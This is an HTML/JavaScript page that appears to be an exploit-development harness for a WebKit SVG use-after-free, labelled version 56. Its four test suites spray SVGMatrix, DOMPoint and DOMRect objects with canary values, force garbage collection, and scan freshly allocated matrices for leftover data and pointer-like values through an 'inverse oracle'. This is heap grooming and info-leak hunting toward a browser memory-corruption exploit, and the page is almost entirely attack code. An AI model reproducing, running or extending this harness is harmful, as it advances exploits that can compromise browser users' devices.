<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SVG UAF v56 — IsoHeap reuse + standalone matrix</title>
<style>
*{box-sizing:border-box}
body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
h2{color:#00ff88;margin:6px 0;font-size:14px}
#controls{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px}
button{background:#1a1a2e;color:#00ff88;border:1px solid #00ff88;padding:6px 12px;font-family:monospace;font-size:12px;cursor:pointer;border-radius:3px}
button:active{background:#00ff88;color:#0a0a0a}
button.run-all{background:#003300;border-color:#00ff88;font-weight:bold}
button.copy-btn{background:#1a1a2e;border-color:#00aaff;color:#00aaff}
button.copy-btn:active{background:#00aaff;color:#0a0a0a}
button.clear-btn{border-color:#ff4444;color:#ff4444}
#out{border:1px solid #222;padding:8px;min-height:100px;max-height:70vh;overflow-y:auto}
pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
.hit{color:#00ff88}.miss{color:#ff4444}.warn{color:#ffaa00}.info{color:#888}
.suite-hdr{color:#00aaff;margin-top:6px}
#copy-toast{position:fixed;bottom:20px;right:20px;background:#00aaff;color:#000;padding:6px 14px;border-radius:4px;font-family:monospace;font-size:12px;opacity:0;transition:opacity 0.2s;pointer-events:none}
</style>
</head>
<body>
<h2>SVG UAF v56 — IsoHeap reuse: standalone matrix / same-bucket / type hunt</h2>
<div id="controls">
  <button class="run-all" onclick="runAll()">▶ Run All</button>
  <button onclick="runSuite('ADR17')">ADR17: SVGMatrix same-bucket reuse</button>
  <button onclick="runSuite('ADR18')">ADR18: 48-byte type hunt</button>
  <button onclick="runSuite('ADR19')">ADR19: createSVGMatrix standalone lifecycle</button>
  <button onclick="runSuite('ADR20')">ADR20: SVGMatrix.translate/scale leak</button>
  <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
  <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
</div>
<div id="out"></div>
<div id="copy-toast">Copied!</div>
<script>
var SVG_NS='http://www.w3.org/2000/svg';
function L(s,cls){
  var d=document.getElementById('out');
  var p=document.createElement('pre');
  if(cls)p.className=cls;
  p.textContent=s;
  d.appendChild(p);
  d.scrollTop=d.scrollHeight;
}
function clearOut(){document.getElementById('out').innerHTML='';}
function copyAll(){
  var lines=document.getElementById('out').querySelectorAll('pre');
  var text=Array.from(lines).map(function(p){return p.textContent;}).join('\n');
  var toast=document.getElementById('copy-toast');
  try{
    navigator.clipboard.writeText(text).then(function(){
      toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);
    }).catch(function(){fallbackCopy(text,toast);});
  }catch(e){fallbackCopy(text,toast);}
}
function fallbackCopy(text,toast){
  var ta=document.createElement('textarea');ta.value=text;
  ta.style.cssText='position:fixed;top:-9999px;left:-9999px';
  document.body.appendChild(ta);ta.select();
  try{document.execCommand('copy');toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}
  catch(e){L('Copy failed: '+e.message,'miss');}
  document.body.removeChild(ta);
}

// ── shared helpers ──────────────────────────────────────────────
var _tmp=null;
function getTmp(){if(!_tmp){_tmp=document.createElementNS(SVG_NS,'svg');document.body.appendChild(_tmp);}return _tmp;}
var _dv=new DataView(new ArrayBuffer(8));
function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
function isPointerLike(f){
  if(!isFinite(f)||isNaN(f)||f<=0)return false;
  return f>=(1<<28)&&f<Math.pow(2,48);
}
function makeSVG(){
  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('width','2');svg.setAttribute('height','2');
  svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
  document.body.appendChild(svg);
  return svg;
}
function removeSVG(svg){if(svg&&svg.parentNode)svg.parentNode.removeChild(svg);}
function getOrphanedMatrix(){
  var svg=makeSVG();
  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
  var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
  var m=g.transform.baseVal.getItem(0).matrix;
  g.transform.baseVal.removeItem(0);
  g.parentNode.removeChild(g);removeSVG(svg);
  return m;
}
function inverseOracle(K){
  var m=getOrphanedMatrix();
  m.a=1/K;m.b=0;m.c=0;m.d=K;m.e=0;m.f=0;
  return m.inverse().a;
}
// GC pressure helper
function gcPressure(n){
  var g=[];
  for(var i=0;i<(n||100000);i++) g.push({x:i,s:''+i,a:[i]});
  g=null;
}

// ─────────────────────────────────────────────────────────────────
// ADR19 — standalone createSVGMatrix() lifecycle
//
// svg.createSVGMatrix() returns an SVGMatrix NOT attached to any
// SVGTransform. In WebKit, this creates a standalone AffineTransform
// wrapped in an SVGMatrix JS object with RefPtr ownership.
//
// Key question: when the JS var goes out of scope, is the C++ object
// freed? Unlike transform.baseVal.getItem().matrix (which has the
// SVGTransformList keeping a Ref<>), a standalone createSVGMatrix()
// result might be FULLY GC-controlled with NO extra Ref<> overhang.
//
// If so: spray 500 standalone SVGMatrices with canary float64,
// let them go out of scope + GC, then alloc 500 more and check
// for leftover data. This would be the first REAL IsoHeap reuse.
// ─────────────────────────────────────────────────────────────────
function runADR19(){
  L('','suite-hdr');L('ADR19: createSVGMatrix() standalone lifecycle probe');

  var svg=makeSVG();

  // Test 1: confirm createSVGMatrix() gives a real writable SVGMatrix
  var m1=svg.createSVGMatrix();
  m1.a=1.1;m1.b=2.2;m1.c=3.3;m1.d=4.4;m1.e=5.5;m1.f=6.6;
  L('ADR19: [T1] createSVGMatrix writable: a='+m1.a+' b='+m1.b+' e='+m1.e);
  L('ADR19: [T1] a bits='+f64hex(m1.a)+' e bits='+f64hex(m1.e));
  // Are the fields float64?
  var f64test=1234567890.123456789;
  m1.e=f64test;
  L('ADR19: [T1] f64 test: wrote='+f64test+' read='+m1.e+' isF64='+(m1.e===f64test)+' bits='+f64hex(m1.e));

  // Test 2: does createSVGMatrix have the same IsoHeap bucket as transform.matrix?
  // Write a known value to both types and check bits are same width
  var m2=getOrphanedMatrix(); // via transform path
  var m3=svg.createSVGMatrix(); // standalone path
  var SECRET=0x1b000deadbeef;
  m2.e=SECRET; m3.e=SECRET;
  L('ADR19: [T2] transform.matrix.e='+m2.e+' bits='+f64hex(m2.e));
  L('ADR19: [T2] createSVGMatrix.e='+m3.e+' bits='+f64hex(m3.e));
  L('ADR19: [T2] both exact='+(m2.e===SECRET&&m3.e===SECRET));

  // Test 3: lifecycle — use WeakRef to detect GC
  // Alloc standalone matrices inside a block scope, drop refs, check WeakRef
  var weakRefs=[];
  (function allocBlock(){
    for(var k=0;k<200;k++){
      var m=svg.createSVGMatrix();
      m.a=0xdeadbeef;m.e=0x1b0dead0000+k;
      weakRefs.push(new WeakRef(m));
      // m goes out of scope here — only WeakRef holds it in JS
    }
  })();
  gcPressure(200000);
  var alive1=weakRefs.filter(function(w){return w.deref()!==undefined;}).length;
  L('ADR19: [T3] after 200k GC pressure: standalone alive='+alive1+'/200');
  // vs transform-path matrices
  var weakRefs2=[];
  (function allocBlock2(){
    for(var k=0;k<200;k++){
      var m=getOrphanedMatrix();
      m.a=0xdeadbeef;m.e=0x1b0cafe0000+k;
      weakRefs2.push(new WeakRef(m));
    }
  })();
  gcPressure(200000);
  var alive2=weakRefs2.filter(function(w){return w.deref()!==undefined;}).length;
  L('ADR19: [T3] after 200k GC pressure: transform-orphan alive='+alive2+'/200');
  L('ADR19: [T3] standalone GC-able='+(alive1<200)+' transform-orphan GC-able='+(alive2<200));

  // Test 4: THE KEY TEST — spray canary, drop refs, GC, spray fresh, read fields
  // Use standalone path since it MIGHT have better GC behavior
  var CANARY_A=1.23456789e15;
  var CANARY_E=9.87654321e14;
  var SPRAY=300;

  // Phase A: spray with canary, drop ALL refs
  (function phaseA(){
    for(var k=0;k<SPRAY;k++){
      var m=svg.createSVGMatrix();
      m.a=CANARY_A+k;m.b=0.111;m.c=0.222;m.d=CANARY_A-k;m.e=CANARY_E+k;m.f=CANARY_E-k;
      // m goes out of scope — NO weak ref kept
    }
  })();

  // Aggressive GC
  gcPressure(500000);
  // Second pass
  var gcArr=new Array(100000).fill(0).map(function(_,i){return {v:i};});
  gcArr=null;
  gcPressure(200000);

  L('ADR19: [T4] GC done, spraying '+SPRAY+' fresh standalone matrices...');
  var hits=[];
  for(var k=0;k<SPRAY;k++){
    var m=svg.createSVGMatrix();
    var snap={a:m.a,b:m.b,c:m.c,d:m.d,e:m.e,f:m.f};
    var dirty=[];
    if(snap.a!==1) dirty.push('a='+snap.a);
    if(snap.b!==0) dirty.push('b='+snap.b);
    if(snap.c!==0) dirty.push('c='+snap.c);
    if(snap.d!==1) dirty.push('d='+snap.d);
    if(snap.e!==0) dirty.push('e='+snap.e+' '+f64hex(snap.e));
    if(snap.f!==0) dirty.push('f='+snap.f+' '+f64hex(snap.f));
    if(dirty.length>0){
      hits.push(k);
      if(hits.length<=8) L('ADR19: ★ fresh['+k+'] non-identity: '+dirty.join(' '),'hit');
    }
    for(var field of['a','b','c','d','e','f']){
      if(isPointerLike(snap[field])){
        L('ADR19: ★★ fresh['+k+'].'+field+'='+snap[field]+' PTR-LIKE! oracle='+inverseOracle(snap[field]),'hit');
      }
    }
  }
  L('ADR19: [T4] dirty standalone matrices='+hits.length+'/'+SPRAY+(hits.length>0?' ★ ISOHEAP REUSE!':'clean — no reuse'));

  // Test 5: same but with transform-path orphans as the spray
  (function phaseB(){
    for(var k=0;k<SPRAY;k++){
      var m=getOrphanedMatrix();
      m.a=CANARY_A+k;m.b=0.333;m.c=0.444;m.d=CANARY_A-k;m.e=CANARY_E+k;m.f=CANARY_E-k;
      // m out of scope
    }
  })();
  gcPressure(500000);
  var gcArr2=new Array(100000).fill(0).map(function(_,i){return {v:i};});
  gcArr2=null;
  gcPressure(200000);

  L('ADR19: [T5] transform-orphan spray done, reading fresh standalone...');
  var hits2=[];
  for(var k=0;k<SPRAY;k++){
    var m=svg.createSVGMatrix();
    var snap={a:m.a,b:m.b,c:m.c,d:m.d,e:m.e,f:m.f};
    var dirty=[];
    if(snap.a!==1) dirty.push('a='+snap.a);
    if(snap.b!==0) dirty.push('b='+snap.b);
    if(snap.c!==0) dirty.push('c='+snap.c);
    if(snap.d!==1) dirty.push('d='+snap.d);
    if(snap.e!==0) dirty.push('e='+snap.e+' '+f64hex(snap.e));
    if(snap.f!==0) dirty.push('f='+snap.f+' '+f64hex(snap.f));
    if(dirty.length>0){
      hits2.push(k);
      if(hits2.length<=8) L('ADR19: [T5] ★ fresh['+k+'] non-identity: '+dirty.join(' '),'hit');
    }
    for(var field of['a','b','c','d','e','f']){
      if(isPointerLike(snap[field])){
        L('ADR19: [T5] ★★ fresh['+k+'].'+field+'='+snap[field]+' PTR-LIKE!','hit');
      }
    }
  }
  L('ADR19: [T5] dirty='+hits2.length+'/'+SPRAY+(hits2.length>0?' ★ REUSE!':'clean'));

  removeSVG(svg);
  L('ADR19: done');
}

// ─────────────────────────────────────────────────────────────────
// ADR17 — SVGMatrix same-bucket reuse via transform path
//
// More thorough version: use multiple SVGs and explicitly null
// every reference. Also test with different GC strategies.
// ─────────────────────────────────────────────────────────────────
function runADR17(){
  L('','suite-hdr');L('ADR17: SVGMatrix same-bucket reuse (transform path, thorough)');

  // Strategy: alloc matrices, write canary, then EXPLICITLY null
  // all variables and do multi-stage GC
  var CANARY=7.77777777e13;
  var N=200;

  // Alloc pool — write canary to e and f fields
  // We need to drop the refs as cleanly as possible
  var pool=[];
  for(var k=0;k<N;k++){
    var svg=makeSVG();
    var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
    var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
    var m=g.transform.baseVal.getItem(0).matrix;
    m.a=CANARY+k;m.b=CANARY/2;m.c=CANARY/3;m.d=CANARY-k;m.e=CANARY+k*2;m.f=CANARY+k*3;
    // Drop from DOM
    g.transform.baseVal.removeItem(0);
    g.parentNode.removeChild(g);
    removeSVG(svg);
    // Keep the matrix ref in pool temporarily (to confirm write worked), then null it
    pool.push(m);
  }
  // Verify canaries written
  L('ADR17: pool[0].e='+pool[0].e+' expected='+(CANARY+0));
  L('ADR17: pool[0] bits e='+f64hex(pool[0].e));
  // Now null ALL refs
  for(var k=0;k<pool.length;k++) pool[k]=null;
  pool=null;

  // Multi-stage GC
  gcPressure(500000);
  var tmp=new Array(200000).fill(null).map(function(){return new Object();});tmp=null;
  gcPressure(300000);
  var tmp2=new ArrayBuffer(1024*1024*10); tmp2=null; // 10MB alloc to trigger GC
  gcPressure(200000);

  L('ADR17: GC done, allocating '+N+' fresh matrices...');
  var hits=[];
  for(var k=0;k<N;k++){
    var svg2=makeSVG();
    var g2=document.createElementNS(SVG_NS,'g');svg2.appendChild(g2);
    var xf2=svg2.createSVGTransform();g2.transform.baseVal.appendItem(xf2);
    var m2=g2.transform.baseVal.getItem(0).matrix;
    var snap={a:m2.a,b:m2.b,c:m2.c,d:m2.d,e:m2.e,f:m2.f};
    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
      hits.push(k);
      if(hits.length<=8){
        L('ADR17: ★ dirty['+k+']: a='+snap.a+' b='+snap.b+' e='+snap.e+' f='+snap.f,'hit');
        L('ADR17: ★ e bits='+f64hex(snap.e)+' f bits='+f64hex(snap.f),'hit');
      }
    }
    for(var field of['a','b','c','d','e','f']){
      if(isPointerLike(snap[field])){
        L('ADR17: ★★ ['+k+'].'+field+'='+snap[field]+' PTR-LIKE! oracle='+inverseOracle(snap[field]),'hit');
      }
    }
    g2.transform.baseVal.removeItem(0);g2.parentNode.removeChild(g2);removeSVG(svg2);
  }
  L('ADR17: dirty='+hits.length+'/'+N+(hits.length>0?' ★ REUSE!':'clean'));
  L('ADR17: done');
}

// ─────────────────────────────────────────────────────────────────
// ADR18 — 48-byte C++ type hunt
//
// SVGMatrix (AffineTransform) is 48 bytes: 6 × float64.
// What other WebKit SVG/DOM C++ types might share the 48-byte
// IsoHeap bucket?
//
// Candidates:
// - SVGTransform itself? No — it contains an AffineTransform (48B)
//   + type uint + angle float = probably 56-64B
// - SVGPreserveAspectRatio? Small: align uint + meetOrSlice uint ~ 8B
// - CSSNumericValue? Maybe — CSS Typed OM
// - DOMPointReadOnly? x,y,z,w float64 = 32B? Or with vtable = 40B?
// - DOMRect? x,y,w,h float64 = 32B + vtable = 40B?
// - WebKitCSSMatrix? Full 4x4 = 128B
//
// DOMPoint: {x,y,z,w} all float64. With vtable ptr = 8+32 = 40B?
// Or with ref count = 8+8+32 = 48B!
//
// Test: alloc DOMPoints, write canaries, drop refs, GC,
// alloc SVGMatrices, check for DOMPoint float64 values in matrix fields.
// ─────────────────────────────────────────────────────────────────
function runADR18(){
  L('','suite-hdr');L('ADR18: 48-byte C++ type hunt — DOMPoint/DOMRect cross-type');

  // Test 1: DOMPoint float64 precision check
  var pt=new DOMPoint(1.23456789e15, 9.87654321e14, 1.11111111e13, 2.22222222e12);
  L('ADR18: [T1] DOMPoint.x bits='+f64hex(pt.x)+' isF64='+(pt.x===1.23456789e15));
  L('ADR18: [T1] DOMPoint.y bits='+f64hex(pt.y)+' isF64='+(pt.y===9.87654321e14));
  // Confirm DOMPoint uses float64

  // Test 2: DOMPoint → SVGMatrix cross-type
  // Alloc N DOMPoints with canary, drop, GC, alloc SVGMatrix
  var CANARY_X=3.33333333e14;
  var CANARY_Y=4.44444444e14;
  var N=300;
  L('ADR18: [T2] spraying '+N+' DOMPoints then reading SVGMatrices...');
  (function domSpray(){
    for(var k=0;k<N;k++){
      var dp=new DOMPoint(CANARY_X+k, CANARY_Y+k, CANARY_X/2+k, CANARY_Y/2+k);
      // dp goes out of scope
    }
  })();
  gcPressure(400000);
  var tmp=new Array(100000).fill(0).map(Object);tmp=null;
  gcPressure(200000);

  var hits18=[];
  for(var k=0;k<N;k++){
    var svg=makeSVG();
    var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
    var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
    var m=g.transform.baseVal.getItem(0).matrix;
    var snap={a:m.a,b:m.b,c:m.c,d:m.d,e:m.e,f:m.f};
    if(snap.a!==1||snap.b!==0||snap.c!==0||snap.d!==1||snap.e!==0||snap.f!==0){
      hits18.push(k);
      if(hits18.length<=8){
        L('ADR18: [T2] ★ matrix['+k+']: e='+snap.e+' '+f64hex(snap.e)+' f='+snap.f+' '+f64hex(snap.f),'hit');
        L('ADR18: [T2] ★ a='+snap.a+' b='+snap.b+' c='+snap.c+' d='+snap.d,'hit');
      }
    }
    for(var field of['a','b','c','d','e','f']){
      if(isPointerLike(snap[field])){
        L('ADR18: ★★ ['+k+'].'+field+'='+snap[field]+' PTR-LIKE! oracle='+inverseOracle(snap[field]),'hit');
      }
    }
    g.transform.baseVal.removeItem(0);g.parentNode.removeChild(g);removeSVG(svg);
  }
  L('ADR18: [T2] DOMPoint→SVGMatrix hits='+hits18.length+'/'+N+(hits18.length>0?' ★ CROSS-TYPE!':'clean'));

  // Test 3: DOMRect → SVGMatrix
  // DOMRect: x,y,width,height all f64 + vtable + refcount = 48B?
  L('ADR18: [T3] DOMRect→SVGMatrix cross-type...');
  var CANARY_R=5.55555555e14;
  (function rectSpray(){
    for(var k=0;k<N;k++){
      var dr=new DOMRect(CANARY_R+k, CANARY_R/2+k, CANARY_R/3+k, CANARY_R/4+k);
    }
  })();
  gcPressure(400000);
  var tmp2=new Array(100000).fill(0).map(Object);tmp2=null;
  gcPressure(200000);

  var hits18b=[];
  for(var k=0;k<N;k++){
    var svg2=makeSVG();
    var g2=document.createElementNS(SVG_NS,'g');svg2.appendChild(g2);
    var xf2=svg2.createSVGTransform();g2.transform.baseVal.appendItem(xf2);
    var m2=g2.transform.baseVal.getItem(0).matrix;
    var snap2={a:m2.a,b:m2.b,c:m2.c,d:m2.d,e:m2.e,f:m2.f};
    if(snap2.a!==1||snap2.b!==0||snap2.c!==0||snap2.d!==1||snap2.e!==0||snap2.f!==0){
      hits18b.push(k);
      if(hits18b.length<=8){
        L('ADR18: [T3] ★ matrix['+k+']: e='+snap2.e+' '+f64hex(snap2.e),'hit');
        L('ADR18: [T3] ★ a='+snap2.a+' d='+snap2.d+' bits a='+f64hex(snap2.a),'hit');
      }
    }
    for(var field of['a','b','c','d','e','f']){
      if(isPointerLike(snap2[field])){
        L('ADR18: [T3] ★★ ['+k+'].'+field+'='+snap2[field]+' PTR-LIKE!','hit');
      }
    }
    g2.transform.baseVal.removeItem(0);g2.parentNode.removeChild(g2);removeSVG(svg2);
  }
  L('ADR18: [T3] DOMRect→SVGMatrix hits='+hits18b.length+'/'+N+(hits18b.length>0?' ★ CROSS-TYPE!':'clean'));

  // Test 4: SVGMatrix → DOMPoint (reverse)
  L('ADR18: [T4] SVGMatrix→DOMPoint reverse cross-type...');
  var CANARY_M=6.66666666e14;
  (function matSpray(){
    for(var k=0;k<N;k++){
      var svg3=makeSVG();
      var g3=document.createElementNS(SVG_NS,'g');svg3.appendChild(g3);
      var xf3=svg3.createSVGTransform();g3.transform.baseVal.appendItem(xf3);
      var m3=g3.transform.baseVal.getItem(0).matrix;
      m3.a=CANARY_M;m3.b=CANARY_M/2;m3.c=CANARY_M/3;m3.d=CANARY_M/4;m3.e=CANARY_M/5;m3.f=CANARY_M/6;
      g3.transform.baseVal.removeItem(0);g3.parentNode.removeChild(g3);removeSVG(svg3);
    }
  })();
  gcPressure(400000);

  var domHits=0;
  for(var k=0;k<N;k++){
    var dp2=new DOMPoint();
    if(dp2.x!==0||dp2.y!==0||dp2.z!==0||dp2.w!==1){
      domHits++;
      if(domHits<=5) L('ADR18: [T4] ★ DOMPoint['+k+']: x='+dp2.x+' y='+dp2.y+' z='+dp2.z+' w='+dp2.w,'hit');
      if(isPointerLike(dp2.x)) L('ADR18: [T4] ★★ x PTR-LIKE!','hit');
    }
  }
  L('ADR18: [T4] dirty DOMPoints='+domHits+'/'+N+(domHits>0?' ★ CROSS-TYPE!':'clean'));

  L('ADR18: done');
}

// ─────────────────────────────────────────────────────────────────
// ADR20 — SVGMatrix.translate/scale return value leak
//
// SVGMatrix.translate(tx,ty) creates a NEW SVGMatrix C++ object.
// SVGMatrix.scale(s) creates a NEW SVGMatrix C++ object.
// SVGMatrix.rotate(angle) creates a NEW SVGMatrix C++ object.
// SVGMatrix.multiply(other) creates a NEW SVGMatrix C++ object.
//
// These are computed results. The C++ allocates a fresh AffineTransform
// and returns it. If it comes from an IsoHeap slot that had previous
// data... the computed result might have unexpected bits.
//
// Specifically: if the NEW SVGMatrix object's memory wasn't zeroed,
// and the computation only writes to SOME fields (e.g. translate
// only writes e and f, leaving a,b,c,d from the slot), then reading
// the full 6 fields of the result gives us leftover data.
//
// BUT: C++ initializes the new AffineTransform to identity in the
// constructor. So we'd only see leakage if the constructor fails
// to write all fields... which is unlikely.
//
// Better angle: translate()/scale() return the result as a NEW JS
// SVGMatrix object. What is the C++ object's vtable pointer?
// If we can read vtable+0 offset from the object's memory, that's
// a code pointer. The inverse() oracle reads float64 fields starting
// at offset +8 (after vtable+refcount). What if we read what's at
// offset 0 (vtable)?
//
// We can't do that directly. BUT: if the IsoHeap page layout puts
// field 'a' at byte 0 of the object (no vtable prefix because
// AffineTransform is a plain struct wrapped in SVGMatrix), then
// what IS at the start?
//
// AffineTransform layout (WebKit source):
// double m_transform[6] = {a, b, c, d, e, f}
// So a IS at offset 0 of AffineTransform. No vtable in AffineTransform.
// The vtable is in SVGMatrix (the JS wrapper), not AffineTransform.
// So all 6 fields are pure float64 data. No vtable to leak.
//
// NEW IDEA for ADR20: use translate() to probe what value the
// IsoHeap gives for the NEWLY allocated result object before
// the constructor fills it. This requires a race or a way to
// observe the object pre-construction. Not directly possible.
//
// REAL ADR20: instead probe SVGMatrix fields via JSON.stringify /
// toString / object spread to see if any hidden property leaks
// C++ internals. Also test: does structuredClone(matrix) expose
// anything different?
// ─────────────────────────────────────────────────────────────────
function runADR20(){
  L('','suite-hdr');L('ADR20: SVGMatrix introspection / hidden property / structuredClone probe');

  var svg=makeSVG();
  var m=svg.createSVGMatrix();
  m.a=1;m.b=0;m.c=0;m.d=1;m.e=0x1b0dead0000;m.f=0x1b0cafe0000;

  // Test 1: What properties does SVGMatrix actually expose?
  var keys=[];
  for(var k in m) keys.push(k);
  L('ADR20: [T1] for..in keys: '+keys.join(', '));
  L('ADR20: [T1] Object.keys: '+Object.keys(m).join(', '));
  try{
    var desc=Object.getOwnPropertyDescriptors(m);
    L('ADR20: [T1] own props: '+Object.keys(desc).join(', '));
  }catch(ex){L('ADR20: [T1] getOwnPropertyDescriptors: '+ex.message,'warn');}

  // Test 2: Symbol properties
  var syms=Object.getOwnPropertySymbols(m);
  L('ADR20: [T2] symbol props: '+syms.length+(syms.length>0?' '+syms.map(String).join(' '):''));

  // Test 3: prototype chain — does it expose anything useful?
  var proto=Object.getPrototypeOf(m);
  L('ADR20: [T3] proto: '+proto);
  var protoKeys=proto?Object.getOwnPropertyNames(proto):[];
  L('ADR20: [T3] proto methods: '+protoKeys.join(', '));

  // Test 4: Does SVGMatrix have a toJSON or toString that leaks?
  L('ADR20: [T4] toString: '+m.toString());
  try{L('ADR20: [T4] JSON: '+JSON.stringify(m));}catch(ex){L('ADR20: [T4] JSON error: '+ex.message,'warn');}

  // Test 5: structuredClone — does the clone have same precision?
  try{
    var clone=structuredClone(m);
    L('ADR20: [T5] clone.e='+clone.e+' bits='+f64hex(clone.e)+' exact='+(clone.e===0x1b0dead0000));
    L('ADR20: [T5] clone.f='+clone.f+' bits='+f64hex(clone.f)+' exact='+(clone.f===0x1b0cafe0000));
  }catch(ex){L('ADR20: [T5] structuredClone: '+ex.message,'warn');}

  // Test 6: Proxy trap — can we intercept property access on SVGMatrix?
  // If we wrap SVGMatrix in a Proxy, do internal C++ accesses go through it?
  try{
    var accessLog=[];
    var proxy=new Proxy(m,{
      get:function(t,p){
        accessLog.push('get:'+String(p));
        return t[p];
      },
      set:function(t,p,v){
        accessLog.push('set:'+String(p)+'='+v);
        t[p]=v;return true;
      }
    });
    // Call inverse() on the proxy — does WebKit use the proxy fields or the C++ fields?
    var inv=proxy.inverse();
    L('ADR20: [T6] proxy.inverse() works: a='+inv.a);
    L('ADR20: [T6] proxy access log: '+accessLog.join(', '));
    // Does inverse() access a,b,c,d,e,f through JS property getters?
    // If accessLog shows get:a get:b get:c get:d get:e get:f → JS path (interceptable!)
    // If accessLog is empty → C++ reads direct from AffineTransform memory (expected)
    if(accessLog.length>0){
      L('ADR20: [T6] ★ inverse() goes through JS getters! count='+accessLog.length,'hit');
    } else {
      L('ADR20: [T6] inverse() reads C++ directly (expected), proxy unobservable');
    }
  }catch(ex){L('ADR20: [T6] Proxy: '+ex.message,'warn');}

  // Test 7: Can we define a getter on SVGMatrix instance to intercept C++ reads?
  try{
    var m2=svg.createSVGMatrix();
    m2.a=1;m2.d=1;m2.e=1234567890;m2.f=9876543210;
    var eRead=false;
    Object.defineProperty(m2,'e',{
      get:function(){eRead=true;return 999999;},
      configurable:true
    });
    var inv2=m2.inverse();
    L('ADR20: [T7] after defineProperty on .e: getter called='+eRead);
    L('ADR20: [T7] inverse.a='+(inv2?inv2.a:'null')+' (if getter worked, should use 999999, not 1234567890)');
    // If getter intercepted: inv.a=1/999999 * determinant correction
    // If C++ reads direct: inv.a computed from real C++ m_transform[4]
  }catch(ex){L('ADR20: [T7] defineProperty: '+ex.message,'warn');}

  removeSVG(svg);
  L('ADR20: done');
}

// ─────────────────────────────────────────────────────────────────
// RUN ALL
// ─────────────────────────────────────────────────────────────────
var suites={ADR17:runADR17,ADR18:runADR18,ADR19:runADR19,ADR20:runADR20};
function runSuite(name){
  L('=== '+name+' ===','suite-hdr');
  try{suites[name]();}catch(ex){L(name+' UNCAUGHT: '+ex.message+'\n'+(ex.stack||''),'miss');}
  L('=== '+name+' done ===','info');
}
function runAll(){
  clearOut();
  L('SVG UAF v56 — IsoHeap reuse + standalone matrix','suite-hdr');
  L('----------------------------------------------------');
  var names=Object.keys(suites);
  var i=0;
  function next(){
    if(i>=names.length){L('','suite-hdr');L('ALL SUITES COMPLETE');return;}
    runSuite(names[i++]);
    setTimeout(next,150);
  }
  next();
}
</script>
